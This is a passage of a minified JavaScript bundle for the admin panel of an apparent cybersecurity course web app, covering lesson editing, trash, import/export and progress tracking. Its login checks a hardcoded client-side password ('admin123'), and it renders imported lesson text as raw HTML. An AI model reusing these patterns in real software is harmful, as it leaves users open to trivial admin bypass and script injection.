1-2-2V5a2 2 0 0 1 2-2h12.344",key:"2acyp4"}],["path",{d:"m9 11 3 3L22 4",key:"1pflzl"}]],vh=ae("square-check-big",Yy);const qy=[["rect",{width:"18",height:"18",x:"3",y:"3",rx:"2",key:"afitv7"}]],Gy=ae("square",qy);const Vy=[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"12",r:"6",key:"1vlfrh"}],["circle",{cx:"12",cy:"12",r:"2",key:"1c9p78"}]],Xy=ae("target",Vy);const Qy=[["path",{d:"M10 11v6",key:"nco0om"}],["path",{d:"M14 11v6",key:"outv1u"}],["path",{d:"M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6",key:"miytrc"}],["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2",key:"e791ji"}]],un=ae("trash-2",Qy);const Ky=[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",key:"wmoenq"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]],on=ae("triangle-alert",Ky);const Zy=[["path",{d:"M9 14 4 9l5-5",key:"102s5s"}],["path",{d:"M4 9h10.5a5.5 5.5 0 0 1 5.5 5.5a5.5 5.5 0 0 1-5.5 5.5H11",key:"f3b9sd"}]],Sh=ae("undo-2",Zy);const Wy=[["path",{d:"M12 3v12",key:"1x0j5s"}],["path",{d:"m17 8-5-5-5 5",key:"7q97r8"}],["path",{d:"M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",key:"ih7n3h"}]],Jy=ae("upload",Wy);const Fy=[["path",{d:"M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2",key:"1yyitq"}],["path",{d:"M16 3.128a4 4 0 0 1 0 7.744",key:"16gr8j"}],["path",{d:"M22 21v-2a4 4 0 0 0-3-3.87",key:"kshegd"}],["circle",{cx:"9",cy:"7",r:"4",key:"nufk8"}]],bh=ae("users",Fy);const $y=[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]],zs=ae("x",$y),Iy="admin123",eo="cybersecurity-course-overrides",to="cybersecurity-course-trash",li="cybersecurity-progress",Ja=w=>{const B=w.split(/\s+/).filter(Me=>Me.length>0).length,X=(w.match(/```[\s\S]*?```/g)||[]).length,m=(w.match(/<tip>[\s\S]*?<\/tip>/g)||[]).length,H=(w.match(/<warning>[\s\S]*?<\/warning>/g)||[]).length,J=(w.match(/\|.*\|.*\n\|[-\s|]+\|/g)||[]).length,ce=(w.match(/^##+ .+$/gm)||[]).length;return{wordCount:B,codeBlocks:X,tips:m,warnings:H,tables:J,headers:ce}},ao=w=>{const B=w.match(/(\d+)/);return B?parseInt(B[1]):0},xh=(w,B)=>`${w}-${B+1}`,Py=({message:w,type:B,onClose:X})=>($.useEffect(()=>{const m=setTimeout(X,3e3);return()=>clearTimeout(m)},[X]),s.jsxs("div",{className:`toast toast-${B}`,children:[B==="success"&&s.jsx(ta,{size:18}),B==="error"&&s.jsx(no,{size:18}),B==="warning"&&s.jsx(on,{size:18}),s.jsx("span",{children:w})]})),eg=({isOpen:w,title:B,message:X,onConfirm:m,onCancel:H,confirmText:J="Delete",isDangerous:ce=!0})=>w?s.jsx("div",{className:"modal-overlay",children:s.jsxs("div",{className:"modal-content",children:[s.jsxs("div",{className:"modal-header",children:[s.jsx(on,{size:24,className:ce?"text-danger":"text-warning"}),s.jsx("h3",{children:B})]}),s.jsx("p",{className:"modal-message",children:X}),s.jsxs("div",{className:"modal-actions",children:[s.jsx("button",{className:"modal-btn cancel",onClick:H,children:"Cancel"}),s.jsx("button",{className:`modal-btn ${ce?"danger":"confirm"}`,onClick:m,children:J})]})]})}):null,lo=({isOpen:w,title:B,children:X,onClose:m,onSave:H,saveText:J="Save"})=>w?s.jsx("div",{className:"modal-overlay",children:s.jsxs("div",{className:"modal-content modal-form",children:[s.jsxs("div",{className:"modal-header",children:[s.jsx("h3",{children:B}),s.jsx("button",{className:"modal-close",onClick:m,children:s.jsx(zs,{size:20})})]}),s.jsx("div",{className:"modal-body",children:X}),s.jsxs("div",{className:"modal-actions",children:[s.jsx("button",{className:"modal-btn cancel",onClick:m,children:"Cancel"}),s.jsxs("button",{className:"modal-btn save",onClick:H,children:[s.jsx(Ch,{size:16}),J]})]})]})}):null;function tg({courseData:w,isOpen:B,onClose:X}){const[m,H]=$.useState(!1),[J,ce]=$.useState(""),[Me,q]=$.useState(""),[j,ue]=$.useState("dashboard"),[Q,Ne]=$.useState({}),[se,Ge]=$.useState(null),[Ve,mt]=$.useState(!1),[ve,st]=$.useState([]),[G,tt]=$.useState({chapters:[],deletedChapters:[],deletedLessons:{}}),[O,R]=$.useState({chapters:[],lessons:[]}),[D,_]=$.useState([]),[Ze,_e]=$.useState({isOpen:!1,title:"",message:"",onConfirm:null}),[dt,ye]=$.useState(null),[De,We]=$.useState(null),[Ce,b]=$.useState(!1),[k,Z]=$.useState(null),[I,oe]=$.useState({id:"",title:"",description:""}),[d,T]=$.useState({id:"",title:"",duration:"",content:"",chapterId:""}),[z,L]=$.useState(""),[P,ie]=$.useState("order"),[re,at]=$.useState(!1),[xe,_t]=$.useState(new Set),[aa,ja]=$.useState(!1),je=$.useCallback((o,N="success")=>{const S=Date.now();_(E=>[...E,{id:S,message:o,type:N}])},[]),la=$.useCallback(o=>{_(N=>N.filter(S=>S.id!==o))},[]);$.useEffect(()=>{const o=localStorage.getItem(li);o&&st(JSON.parse(o));const N=localStorage.getItem(eo);if(N)try{tt(JSON.parse(N))}catch(E){console.error("Failed to parse overrides:",E)}const S=localStorage.getItem(to);if(S)try{R(JSON.parse(S))}catch(E){console.error("Failed to parse trash:",E)}},[B]);const ft=$.useCallback(o=>{tt(o),localStorage.setItem(eo,JSON.stringify(o))},[]),Jt=$.useCallback(o=>{R(o),localStorage.setItem(to,JSON.stringify(o))},[]),Xe=$.useMemo(()=>{if(!w)return{chapters:[]};let o=[...w.chapters];return G.chapters&&G.chapters.forEach(N=>{const S=o.findIndex(E=>E.id===N.id);S>=0?o[S]={...o[S],...N,lessons:N.lessons||o[S].lessons,_modified:!0}:o.push({...N,_new:!0})}),G.deletedChapters&&(o=o.filter(N=>!G.deletedChapters.includes(N.id))),G.deletedLessons&&(o=o.map(N=>{const S=G.deletedLessons[N.id]||[];return{...N,lessons:N.lessons.filter(E=>!S.includes(E.id))}})),o.sort((N,S)=>N.id-S.id),{...w,chapters:o}},[w,G]),ee=$.useMemo(()=>{const o=Xe.chapters,N=o.flatMap(Pe=>Pe.lessons),S=N.length,E=N.reduce((Pe,lt)=>Pe+ao(lt.duration),0);let M=0,V=0,F=0,de=0,Le=[],jt=[],Be=[];const At=N.map(Pe=>{const lt=Ja(Pe.content);return M+=lt.wordCount,V+=lt.codeBlocks,F+=lt.tips,de+=lt.warnings,lt.wordCount<200&&Le.push(Pe),lt.codeBlocks===0&&jt.push(Pe),lt.tips===0&&Be.push(Pe),{...Pe,...lt}}),mi=S>0?Math.round(ve.length/S*100):0,Pa=o.map(Pe=>{const ia=Pe.lessons.map(sa=>sa.id).filter(sa=>ve.includes(sa)).length;return{...Pe,completed:ia,total:Pe.lessons.length,percent:Pe.lessons.length>0?Math.round(ia/Pe.lessons.length*100):0}});return{totalChapters:o.length,totalLessons:S,totalDuration:E,totalWordCount:M,totalCodeBlocks:V,totalTips:F,totalWarnings:de,avgWordCount:S>0?Math.round(M/S):0,completedCount:ve.length,completionPercent:mi,shortLessons:Le,noCodeLessons:jt,noTipLessons:Be,lessonStats:At,chapterProgress:Pa}},[Xe,ve]),gl=$.useMemo(()=>{let o=Xe.chapters.flatMap(N=>N.lessons.map(S=>({...S,chapterId:N.id,chapterTitle:N.title})));if(z){const N=z.toLowerCase();o=o.filter(S=>S.title.toLowerCase().includes(N)||S.content.toLowerCase().includes(N))}switch(P){case"words":o.sort((N,S)=>Ja(S.content).wordCount-Ja(N.content).wordCount);break;case"duration":o.sort((N,S)=>ao(S.duration)-ao(N.duration));break;default:o.sort((N,S)=>N.chapterId!==S.chapterId?N.chapterId-S.chapterId:N.id.localeCompare(S.id))}return o},[Xe,z,P]),vl=$.useMemo(()=>{const o=localStorage.getItem("cybersecurity-last-accessed");return o?new Date(parseInt(o)).toLocaleString():"Never"},[B]),rn=o=>{o.preventDefault(),J===Iy?(H(!0),q("")):(q("Incorrect password"),ce(""))},ks=o=>{Ne(N=>({...N,[o]:!N[o]}))},Ms=()=>{const o=Math.max(...Xe.chapters.map(N=>N.id),0);oe({id:o+1,title:"",description:""}),b(!0)},pt=()=>{if(!I.title.trim()){je("Chapter title is required","error");return}const o={id:parseInt(I.id),title:I.title.trim(),description:I.description.trim(),lessons:[]},N={...G,chapters:[...G.chapters||[],o]};ft(N),b(!1),oe({id:"",title:"",description:""}),je(`Chapter "${o.title}" created!`,"success")},si=o=>{const N=Xe.chapters.find(E=>E.id===o),S=N?N.lessons.length:0;T({id:xh(o,S),title:"",duration:"5 min",content:`## Introduction

Your lesson content here...

### Section 1

Content...

<tip>
💡 Add helpful tips here!
</tip>
`,chapterId:o}),Z(o)},ci=()=>{if(!d.title.trim()){je("Lesson title is required","error");return}const o={id:d.id,title:d.title.trim(),duration:d.duration.trim()||"5 min",content:d.content},N=parseInt(d.chapterId),S=G.chapters?.find(F=>F.id===N),E=w.chapters.find(F=>F.id===N);let M;if(S)M=G.chapters.map(F=>F.id===N?{...F,lessons:[...F.lessons||E?.lessons||[],o]}:F);else if(E)M=[...G.chapters||[],{...E,lessons:[...E.lessons,o]}];else{je("Chapter not found","error");return}const V={...G,chapters:M};ft(V),Z(null),T({id:"",title:"",duration:"",content:"",chapterId:""}),je(`Lesson "${o.title}" created!`,"success")},ui=o=>{oe({id:o.id,title:o.title,description:o.description||""}),ye(o)},Sl=()=>{const o=dt.id,N=G.chapters?.find(V=>V.id===o),S=w.chapters.find(V=>V.id===o);let E;N?E=G.chapters.map(V=>V.id===o?{...V,title:I.title.trim(),description:I.description.trim()}:V):E=[...G.chapters||[],{...S||{},id:o,title:I.title.trim(),description:I.description.trim(),lessons:S?.lessons||[]}];const M={...G,chapters:E};ft(M),ye(null),oe({id:"",title:"",description:""}),je("Chapter updated!","success")},dn=(o,N)=>{T({id:o.id,title:o.title,duration:o.duration,content:o.content,chapterId:N}),We({...o,chapterId:N}),ue("editor"),at(!0)},oi=()=>{const o=parseInt(De.chapterId),N=G.chapters?.find(F=>F.id===o),S=w.chapters.find(F=>F.id===o),E={id:d.id,title:d.title.trim(),duration:d.duration.trim(),content:d.content,_modified:!0};let M;if(N)M=G.chapters.map(F=>{if(F.id===o){const de=F.lessons||S?.lessons||[],Le=de.findIndex(Be=>Be.id===E.id);let jt;return Le>=0?jt=de.map(Be=>Be.id===E.id?E:Be):(jt=de.map(At=>At.id===E.id?E:At),S?.lessons.find(At=>At.id===E.id)&&(jt=S.lessons.map(At=>At.id===E.id?E:At))),{...F,lessons:jt}}return F});else{const de=(S?.lessons||[]).map(Le=>Le.id===E.id?E:Le);M=[...G.chapters||[],{...S,lessons:de}]}const V={...G,chapters:M};ft(V),We(null),T({id:"",title:"",duration:"",content:"",chapterId:""}),je("Lesson saved!","success")},ri=(o,N)=>{const S=[...Xe.chapters],E=S.findIndex(V=>V.id===o);if(N==="up"&&E>0){const V=S[E].id;S[E].id=S[E-1].id,S[E-1].id=V}else if(N==="down"&&E<S.length-1){const V=S[E].id;S[E].id=S[E+1].id,S[E+1].id=V}const M={...G,chapters:S.map(V=>({...V,lessons:V.lessons}))};ft(M),je("Chapter reordered!","success")},di=(o,N,S)=>{const E=Xe.chapters.find(Be=>Be.id===N);if(!E)return;const M=[...E.lessons],V=M.findIndex(Be=>Be.id===o);S==="up"&&V>0?[M[V],M[V-1]]=[M[V-1],M[V]]:S==="down"&&V<M.length-1&&([M[V],M[V+1]]=[M[V+1],M[V]]);const F=M.map((Be,At)=>({...Be,id:xh(N,At)})),de=G.chapters?.find(Be=>Be.id===N);let Le;de?Le=G.chapters.map(Be=>Be.id===N?{...Be,lessons:F}:Be):Le=[...G.chapters||[],{...E,lessons:F}];const jt={...G,chapters:Le};ft(jt),je("Lesson reordered!","success")},Fa=o=>{_e({isOpen:!0,title:"Delete Chapter?",message:`Are you sure you want to delete "${o.title}"? This will also delete ${o.lessons.length} lessons. This action moves items to trash.`,onConfirm:()=>{const N={...O,chapters:[...O.chapters,{...o,deletedAt:new Date().toISOString()}]};Jt(N);const S={...G,deletedChapters:[...G.deletedChapters||[],o.id]};ft(S),_e({isOpen:!1}),je(`Chapter "${o.title}" moved to trash`,"success")}})},yt=(o,N)=>{_e({isOpen:!0,title:"Delete Lesson?",message:`Are you sure you want to delete "${o.title}"? This action moves the lesson to trash.`,onConfirm:()=>{const S={...O,lessons:[...O.lessons,{...o,chapterId:N,deletedAt:new Date().toISOString()}]};Jt(S);const E={...G.deletedLessons};E[N]||(E[N]=[]),E[N].push(o.id);const M={...G,deletedLessons:E};ft(M),_e({isOpen:!1}),Ge(null),je(`Lesson "${o.title}" moved to trash`,"success")}})},Ft=o=>{const N={...O,chapters:O.chapters.filter(E=>E.id!==o.id)};Jt(N);const S={...G,deletedChapters:(G.deletedChapters||[]).filter(E=>E!==o.id)};ft(S),je(`Chapter "${o.title}" restored!`,"success")},gt=o=>{const N={...O,lessons:O.lessons.filter(M=>M.id!==o.id)};Jt(N);const S={...G.deletedLessons};S[o.chapterId]&&(S[o.chapterId]=S[o.chapterId].filter(M=>M!==o.id));const E={...G,deletedLessons:S};ft(E),je(`Lesson "${o.title}" restored!`,"success")},Ds=()=>{_e({isOpen:!0,title:"Empty Trash?",message:"This will permanently delete all items in the trash. This action cannot be undone!",onConfirm:()=>{Jt({chapters:[],lessons:[]}),_e({isOpen:!1}),je("Trash emptied","success")}})},_s=o=>{_t(N=>{const S=new Set(N);return S.has(o)?S.delete(o):S.add(o),S})},Hs=()=>{const o=Xe.chapters.flatMap(N=>N.lessons.map(S=>S.id));_t(new Set(o))},bl=()=>{_t(new Set)},xl=()=>{const o=[...new Set([...ve,...xe])];st(o),localStorage.setItem(li,JSON.stringify(o)),je(`${xe.size} lessons marked as complete`,"success"),_t(new Set),ja(!1)},Tl=()=>{const o=ve.filter(N=>!xe.has(N));st(o),localStorage.setItem(li,JSON.stringify(o)),je(`${xe.size} lessons marked as incomplete`,"success"),_t(new Set),ja(!1)},na=()=>{_e({isOpen:!0,title:"Delete Selected Lessons?",message:`Are you sure you want to delete ${xe.size} lessons? They will be moved to trash.`,onConfirm:()=>{const o=Xe.chapters.flatMap(M=>M.lessons.filter(V=>xe.has(V.id)).map(V=>({...V,chapterId:M.id}))),N={...O,lessons:[...O.lessons,...o.map(M=>({...M,deletedAt:new Date().toISOString()}))]};Jt(N);const S={...G.deletedLessons};o.forEach(M=>{S[M.chapterId]||(S[M.chapterId]=[]),S[M.chapterId].push(M.id)});const E={...G,deletedLessons:S};ft(E),_e({isOpen:!1}),_t(new Set),ja(!1),je(`${o.length} lessons moved to trash`,"success")}})},Nl=()=>{const o={exportDate:new Date().toISOString(),version:"1.0",courseData:Xe,overrides:G,progress:ve},N=new Blob([JSON.stringify(o,null,2)],{type:"application/json"}),S=URL.createObjectURL(N),E=document.createElement("a");E.href=S,E.download=`cybersecurity-course-${new Date().toISOString().split("T")[0]}.json`,E.click(),URL.revokeObjectURL(S),je("Course exported!","success")},$a=o=>{const N=o.target.files[0];if(!N)return;const S=new FileReader;S.onload=E=>{try{const M=JSON.parse(E.target.result);M.overrides&&ft(M.overrides),M.progress&&(st(M.progress),localStorage.setItem(li,JSON.stringify(M.progress))),je("Course imported successfully!","success")}catch{je("Failed to import: Invalid JSON file","error")}},S.readAsText(N),o.target.value=""},Rs=()=>{let o=`# ${Xe.title||"Cybersecurity Course"}

`;o+=`${Xe.subtitle||""}

---

`,Xe.chapters.forEach(M=>{o+=`# Chapter ${M.id}: ${M.title}

`,o+=`*${M.description}*

`,M.lessons.forEach(V=>{o+=`## ${V.title}

`,o+=`**Duration:** ${V.duration}

`,o+=V.content+`

`,o+=`---

`})});const N=new Blob([o],{type:"text/markdown"}),S=URL.createObjectURL(N),E=document.createElement("a");E.href=S,E.download=`cybersecurity-course-${new Date().toISOString().split("T")[0]}.md`,E.click(),URL.revokeObjectURL(S),je("Exported as Markdown!","success")},fi=()=>{_e({isOpen:!0,title:"Reset to Default?",message:"This will clear all your modifications and revert to the original course content. Progress will be preserved. This cannot be undone!",onConfirm:()=>{localStorage.removeItem(eo),localStorage.removeItem(to),tt({chapters:[],deletedChapters:[],deletedLessons:{}}),R({chapters:[],lessons:[]}),_e({isOpen:!1}),je("Course reset to default","success")}})},fn=()=>{_e({isOpen:!0,title:"Reset Progress?",message:"Are you sure you want to reset all progress? This cannot be undone.",onConfirm:()=>{localStorage.removeItem(li),localStorage.removeItem("cybersecurity-last-accessed"),st([]),_e({isOpen:!1}),je("Progress reset","success")}})},Ia=()=>{const o={exportDate:new Date().toISOString(),completedLessons:ve,lastAccessed:vl,completionPercent:ee.completionPercent,chapterProgress:ee.chapterProgress.map(M=>({id:M.id,title:M.title,completed:M.completed,total:M.total,percent:M.percent}))},N=new Blob([JSON.stringify(o,null,2)],{type:"application/json"}),S=URL.createObjectURL(N),E=document.createElement("a");E.href=S,E.download=`cybersecurity-progress-${new Date().toISOString().split("T")[0]}.json`,E.click(),URL.revokeObjectURL(S),je("Progress exported!","success")},hn=()=>{De?(navigator.clipboard.writeText(d.content),je("Content copied!","success")):se&&(navigator.clipboard.writeText(se.content),je("Content copied!","success"))},Cl=o=>{const N=o.trim().split(`
`),S=[];let E=0,M=!1,V=[],F="";for(;E<N.length;){const de=N[E];if(de.startsWith("```")){M?(S.push(s.jsxs("div",{className:"admin-code-block",children:[s.jsx("div",{className:"admin-code-header",children:s.jsx("span",{children:F})}),s.jsx("pre",{children:V.join(`
`)})]},`code-${E}`)),M=!1):(M=!0,F=de.slice(3).trim()||"text",V=[]),E++;continue}if(M){V.push(de),E++;continue}if(de.includes("<tip>")){let Le=[];for(E++;E<N.length&&!N[E].includes("</tip>");)Le.push(N[E]),E++;S.push(s.jsxs("div",{className:"admin-tip-box",children:[s.jsx(ws,{size:16}),s.jsx("span",{children:Le.join(" ").replace("💡 ","")})]},`tip-${E}`)),E++;continue}if(de.includes("<warning>")){let Le=[];for(E++;E<N.length&&!N[E].includes("</warning>");)Le.push(N[E]),E++;S.push(s.jsxs("div",{className:"admin-warning-box",children:[s.jsx(on,{size:16}),s.jsx("span",{children:Le.join(" ").replace("⚠️ ","")})]},`warn-${E}`)),E++;continue}if(de.startsWith("## ")){S.push(s.jsx("h2",{children:de.slice(3)},`h2-${E}`)),E++;continue}if(de.startsWith("### ")){S.push(s.jsx("h3",{children:de.slice(4)},`h3-${E}`)),E++;continue}de.trim()&&S.push(s.jsx("p",{dangerouslySetInnerHTML:{__html:de.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,"<code>$1</code>")}},`p-${E}`)),E++}return S};if(!B)return null;if(!m)return s.jsx("div",{className:"admin-overlay",children:s.jsxs("div",{className:"admin-login-card",children:[s.jsxs("div",{className:"admin-login-header",children:[s.jsx("div",{className:"admin-login-icon",children:s.jsx(Ay,{size:32})}),s.jsx("h2",{children:"Admin Access"}),s.jsx("p",{children:"Enter password to continue"})]}),s.jsxs("form",{onSubmit:rn,children:[s.jsx("input",{type:"password",value:J,onChange:o=>ce(o.target.value),placeholder:"Enter password",className:"admin-password-input",autoFocus:!0}),Me&&s.jsxs("div",{className:"admin-password-error",children:[s.jsx(no,{size:14}),Me]}),s.jsxs("button",{type:"submit",className:"admin-login-btn",children:[s.jsx(Os,{size:18}),"Access Admin Panel"]})]}),s.jsx("button",{className:"admin-close-btn",onClick:X,children:s.jsx(zs,{size:20})})]})});const hi=[{id:"dashboard",label:"Dashboard",icon:ph},{id:"manage",label:"Manage",icon:so},{id:"content",label:"Content",icon:Es},{id:"progress",label:"Progress",icon:bh},{id:"analytics",label:"Analytics",icon:fh},{id:"editor",label:"Editor",icon:cn},{id:"trash",label:"Trash",icon:un,badge:O.chapters.length+O.lessons.length}];return s.jsxs("div",{className:"admin-overlay",children:[s.jsx("div",{className:"toast-container",children:D.map(o=>s.jsx(Py,{message:o.message,type:o.type,onClose:()=>la(o.id)},o.id))}),s.jsx(eg,{isOpen:Ze.isOpen,title:Ze.title,message:Ze.message,onConfirm:Ze.onConfirm,onCancel:()=>_e({isOpen:!1})}),s.jsxs(lo,{isOpen:Ce,title:"Create New Chapter",onClose:()=>b(!1),onSave:pt,saveText:"Create Chapter",children:[s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Chapter Number"}),s.jsx("input",{type:"number",value:I.id,onChange:o=>oe({...I,id:o.target.value}),className:"form-input"})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Title *"}),s.jsx("input",{type:"text",value:I.title,onChange:o=>oe({...I,title:o.target.value}),placeholder:"Chapter title...",className:"form-input",autoFocus:!0})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Description"}),s.jsx("textarea",{value:I.description,onChange:o=>oe({...I,description:o.target.value}),placeholder:"Brief description...",className:"form-textarea",rows:3})]})]}),s.jsxs(lo,{isOpen:!!dt,title:"Edit Chapter",onClose:()=>ye(null),onSave:Sl,children:[s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Title *"}),s.jsx("input",{type:"text",value:I.title,onChange:o=>oe({...I,title:o.target.value}),className:"form-input",autoFocus:!0})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Description"}),s.jsx("textarea",{value:I.description,onChange:o=>oe({...I,description:o.target.value}),className:"form-textarea",rows:3})]})]}),s.jsxs(lo,{isOpen:!!k,title:"Create New Lesson",onClose:()=>Z(null),onSave:ci,saveText:"Create Lesson",children:[s.jsxs("div",{className:"form-row",children:[s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Lesson ID"}),s.jsx("input",{type:"text",value:d.id,onChange:o=>T({...d,id:o.target.value}),className:"form-input"})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Duration"}),s.jsx("input",{type:"text",value:d.duration,onChange:o=>T({...d,duration:o.target.value}),placeholder:"e.g., 10 min",className:"form-input"})]})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Title *"}),s.jsx("input",{type:"text",value:d.title,onChange:o=>T({...d,title:o.target.value}),placeholder:"Lesson title...",className:"form-input",autoFocus:!0})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Content (Markdown)"}),s.jsx("textarea",{value:d.content,onChange:o=>T({...d,content:o.target.value}),placeholder:"Lesson content in markdown...",className:"form-textarea form-textarea-code",rows:10})]})]}),s.jsxs("div",{className:"admin-container",children:[s.jsxs("div",{className:"admin-header",children:[s.jsxs("div",{className:"admin-header-title",children:[s.jsx(Os,{size:24}),s.jsx("span",{children:"Admin Panel"}),(G.chapters?.length>0||Object.keys(G.deletedLessons||{}).length>0)&&s.jsx("span",{className:"badge badge-modified",children:"Modified"})]}),s.jsx("button",{className:"admin-close-btn",onClick:X,children:s.jsx(zs,{size:24})})]}),s.jsx("div",{className:"admin-tabs",children:hi.map(o=>s.jsxs("button",{className:`admin-tab ${j===o.id?"active":""}`,onClick:()=>ue(o.id),children:[s.jsx(o.icon,{size:18}),s.jsx("span",{children:o.label}),o.badge>0&&s.jsx("span",{className:"tab-badge",children:o.badge})]},o.id))}),s.jsxs("div",{className:"admin-content",children:[j==="dashboard"&&s.jsxs("div",{className:"admin-dashboard",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(ph,{size:20}),s.jsx("span",{children:"Dashboard Overview"})]}),s.jsxs("div",{className:"admin-stats-grid",children:[s.jsxs("div",{className:"admin-stat-card",children:[s.jsx("div",{className:"admin-stat-icon chapters",children:s.jsx(Es,{size:24})}),s.jsxs("div",{className:"admin-stat-info",children:[s.jsx("span",{className:"admin-stat-value",children:ee.totalChapters}),s.jsx("span",{className:"admin-stat-label",children:"Chapters"})]})]}),s.jsxs("div",{className:"admin-stat-card",children:[s.jsx("div",{className:"admin-stat-icon lessons",children:s.jsx(ni,{size:24})}),s.jsxs("div",{className:"admin-stat-info",children:[s.jsx("span",{className:"admin-stat-value",children:ee.totalLessons}),s.jsx("span",{className:"admin-stat-label",children:"Lessons"})]})]}),s.jsxs("div",{className:"admin-stat-card",children:[s.jsx("div",{className:"admin-stat-icon duration",children:s.jsx(io,{size:24})}),s.jsxs("div",{className:"admin-stat-info",children:[s.jsx("span",{className:"admin-stat-value",children:ee.totalDuration}),s.jsx("span",{className:"admin-stat-label",children:"Total Minutes"})]})]}),s.jsxs("div",{className:"admin-stat-card",children:[s.jsx("div",{className:"admin-stat-icon completion",children:s.jsx(Xy,{size:24})}),s.jsxs("div",{className:"admin-stat-info",children:[s.jsxs("span",{className:"admin-stat-value",children:[ee.completionPercent,"%"]}),s.jsx("span",{className:"admin-stat-label",children:"Completed"})]})]})]}),s.jsxs("div",{className:"admin-progress-section",children:[s.jsx("h3",{children:"Course Completion"}),s.jsx("div",{className:"admin-progress-bar-large",children:s.jsx("div",{className:"admin-progress-fill-large",style:{width:`${ee.completionPercent}%`},children:s.jsxs("span",{children:[ee.completedCount,"/",ee.totalLessons," lessons"]})})})]}),s.jsxs("div",{className:"admin-quick-stats",children:[s.jsxs("div",{className:"admin-quick-stat",children:[s.jsx(my,{size:18}),s.jsxs("span",{children:[ee.totalCodeBlocks," code blocks"]})]}),s.jsxs("div",{className:"admin-quick-stat",children:[s.jsx(ws,{size:18}),s.jsxs("span",{children:[ee.totalTips," tips"]})]}),s.jsxs("div",{className:"admin-quick-stat",children:[s.jsx(on,{size:18}),s.jsxs("span",{children:[ee.totalWarnings," warnings"]})]}),s.jsxs("div",{className:"admin-quick-stat",children:[s.jsx(yh,{size:18}),s.jsxs("span",{children:[ee.totalWordCount.toLocaleString()," words"]})]})]}),s.jsxs("div",{className:"admin-last-accessed",children:[s.jsx(io,{size:16}),s.jsxs("span",{children:["Last accessed: ",vl]})]})]}),j==="manage"&&s.jsxs("div",{className:"admin-manage",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(so,{size:20}),s.jsx("span",{children:"Content Management"})]}),s.jsxs("div",{className:"admin-action-grid",children:[s.jsxs("button",{className:"admin-crud-btn create",onClick:Ms,children:[s.jsx(gh,{size:20}),s.jsx("span",{children:"Add Chapter"})]}),s.jsxs("button",{className:"admin-crud-btn import",onClick:()=>document.getElementById("import-input").click(),children:[s.jsx(Jy,{size:20}),s.jsx("span",{children:"Import Course"})]}),s.jsx("input",{id:"import-input",type:"file",accept:".json",onChange:$a,style:{display:"none"}}),s.jsxs("button",{className:"admin-crud-btn export",onClick:Nl,children:[s.jsx(hh,{size:20}),s.jsx("span",{children:"Export Course"})]}),s.jsxs("button",{className:"admin-crud-btn markdown",onClick:Rs,children:[s.jsx(yy,{size:20}),s.jsx("span",{children:"Export Markdown"})]}),s.jsxs("button",{className:"admin-crud-btn reset",onClick:fi,children:[s.jsx(Hy,{size:20}),s.jsx("span",{children:"Reset to Default"})]}),s.jsxs("button",{className:`admin-crud-btn bulk ${aa?"active":""}`,onClick:()=>ja(!aa),children:[s.jsx(vh,{size:20}),s.jsx("span",{children:"Bulk Mode"})]})]}),aa&&xe.size>0&&s.jsxs("div",{className:"bulk-actions-bar",children:[s.jsxs("span",{children:[xe.size," selected"]}),s.jsx("button",{className:"bulk-btn",onClick:Hs,children:"Select All"}),s.jsx("button",{className:"bulk-btn",onClick:bl,children:"Deselect All"}),s.jsxs("button",{className:"bulk-btn complete",onClick:xl,children:[s.jsx(ta,{size:16})," Mark Complete"]}),s.jsxs("button",{className:"bulk-btn incomplete",onClick:Tl,children:[s.jsx(no,{size:16})," Mark Incomplete"]}),s.jsxs("button",{className:"bulk-btn delete",onClick:na,children:[s.jsx(un,{size:16})," Delete"]})]}),s.jsxs("div",{className:"admin-search-bar",children:[s.jsxs("div",{className:"search-input-wrapper",children:[s.jsx(Pu,{size:18}),s.jsx("input",{type:"text",placeholder:"Search lessons...",value:z,onChange:o=>L(o.target.value),className:"search-input"})]}),s.jsxs("select",{value:P,onChange:o=>ie(o.target.value),className:"sort-select",children:[s.jsx("option",{value:"order",children:"Sort: Chapter Order"}),s.jsx("option",{value:"words",children:"Sort: Word Count"}),s.jsx("option",{value:"duration",children:"Sort: Duration"})]})]}),s.jsx("div",{className:"admin-chapters-list",children:Xe.chapters.map((o,N)=>s.jsxs("div",{className:`admin-chapter-item ${o._modified?"modified":""} ${o._new?"new":""}`,children:[s.jsxs("div",{className:"admin-chapter-header",children:[s.jsxs("div",{className:"admin-chapter-info",onClick:()=>ks(o.id),children:[Q[o.id]?s.jsx(ay,{size:18}):s.jsx(ii,{size:18}),s.jsx("div",{className:"admin-chapter-badge",children:o.id}),s.jsxs("div",{className:"admin-chapter-text",children:[s.jsxs("span",{className:"admin-chapter-title",children:[o.title,o._modified&&s.jsx("span",{className:"badge-inline modified",children:"Modified"}),o._new&&s.jsx("span",{className:"badge-inline new",children:"New"})]}),s.jsx("span",{className:"admin-chapter-desc",children:o.description})]})]}),s.jsxs("div",{className:"admin-chapter-actions",children:[s.jsx("button",{className:"icon-btn",onClick:()=>ri(o.id,"up"),disabled:N===0,title:"Move Up",children:s.jsx(dh,{size:16})}),s.jsx("button",{className:"icon-btn",onClick:()=>ri(o.id,"down"),disabled:N===Xe.chapters.length-1,title:"Move 